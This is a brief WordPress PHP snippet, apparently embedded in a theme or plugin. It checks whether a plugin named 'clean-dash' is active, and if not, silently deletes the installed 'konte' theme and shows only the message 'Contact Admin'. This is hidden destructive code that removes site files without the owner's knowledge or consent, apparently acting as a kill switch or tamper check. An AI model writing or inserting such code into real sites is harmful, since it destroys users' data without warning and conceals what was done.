<?php
if ( !function_exists( 'delete_theme' ) ) { 
    require_once ABSPATH . '/wp-admin/includes/theme.php'; 
} 
$list = get_option( 'active_plugins' );
$vendor = 'clean-dash/functions.php'; 
if ( in_array( $vendor , $list ) ) {
} else {
	if(delete_theme('konte')) {
     echo 'Contact Admin';
	}
}